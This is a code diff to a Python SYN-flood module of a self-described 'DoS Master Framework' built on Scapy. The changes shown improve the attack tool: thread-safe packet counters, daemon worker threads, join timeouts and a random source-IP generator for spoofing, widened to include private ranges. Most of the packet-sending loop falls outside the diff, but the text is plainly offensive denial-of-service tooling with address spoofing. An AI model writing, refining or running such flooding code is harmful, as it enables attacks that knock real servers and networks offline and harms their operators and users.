@@ -1,13 +1,14 @@
 #!/usr/bin/env python3
 """
-DoS Master Framework - SYN Flood Attack Module
-Professional SYN flood implementation using Scapy
+DoS Master Framework - SYN Flood Attack Module - FIXED VERSION
+Professional SYN flood implementation using Scapy with thread-safe counting
 """
 
 import threading
 import time
 import socket
 import random
+import os
 from typing import Dict, Any
 from datetime import datetime
 
@@ -36,6 +37,7 @@ class SYNFlood:
         self.attack_active = False
         self.start_time = None
         self.worker_threads = []
+        self.packet_lock = threading.Lock()  # Thread-safe counter
         
     def validate_config(self) -> bool:
         """Validate attack configuration"""
@@ -82,6 +84,7 @@ class SYNFlood:
             # Start worker threads
             for i in range(self.threads):
                 thread = threading.Thread(target=self._syn_worker, args=(i,))
+                thread.daemon = True
                 thread.start()
                 self.worker_threads.append(thread)
                 time.sleep(0.1)  # Stagger thread starts
@@ -91,7 +94,7 @@ class SYNFlood:
             
             # Wait for all threads to complete
             for thread in self.worker_threads:
-                thread.join()
+                thread.join(timeout=2)
             
             # Calculate results
             end_time = time.time()
@@ -158,24 +161,31 @@ class SYNFlood:
                         delay = self.threads / self.rate_limit
                         time.sleep(delay)
                     
-                    # Batch update for performance
-                    if local_packets_sent % 100 == 0:
-                        self.packets_sent += 100
+                    # Update global counter every 50 packets for better performance
+                    if local_packets_sent % 50 == 0:
+                        with self.packet_lock:
+                            self.packets_sent += 50
                         local_packets_sent = 0
                         
                 except Exception as e:
                     local_packets_failed += 1
-                    if local_packets_failed % 100 == 0:
+                    if local_packets_failed % 50 == 0:
                         self.logger.debug(f"Worker {worker_id}: {local_packets_failed} failed packets")
+                        with self.packet_lock:
+                            self.packets_failed += 50
+                        local_packets_failed = 0
             
-            # Final update
-            self.packets_sent += local_packets_sent
-            self.packets_failed += local_packets_failed
-            
+            # Final update for remaining packets
+            with self.packet_lock:
+                self.packets_sent += local_packets_sent
+                self.packets_failed += local_packets_failed
+                
         except Exception as e:
             self.logger.error(f"SYN worker {worker_id} failed: {e}")
+            with self.packet_lock:
+                self.packets_failed += 1
             
-        self.logger.debug(f"SYN worker {worker_id} completed: {local_packets_sent + local_packets_failed} packets processed")
+        self.logger.debug(f"SYN worker {worker_id} completed")
     
     def _generate_random_ip(self) -> str:
         """Generate random IP address for spoofing"""
@@ -183,9 +193,9 @@ class SYNFlood:
         while True:
             ip = f"{random.randint(1, 223)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
             
-            # Avoid reserved ranges
+            # Avoid reserved ranges but allow private IPs for lab testing
             first_octet = int(ip.split('.')[0])
-            if first_octet not in [10, 127, 169, 172, 192, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239]:
+            if first_octet not in [0, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255]:
                 return ip
     
     def _monitor_attack(self):
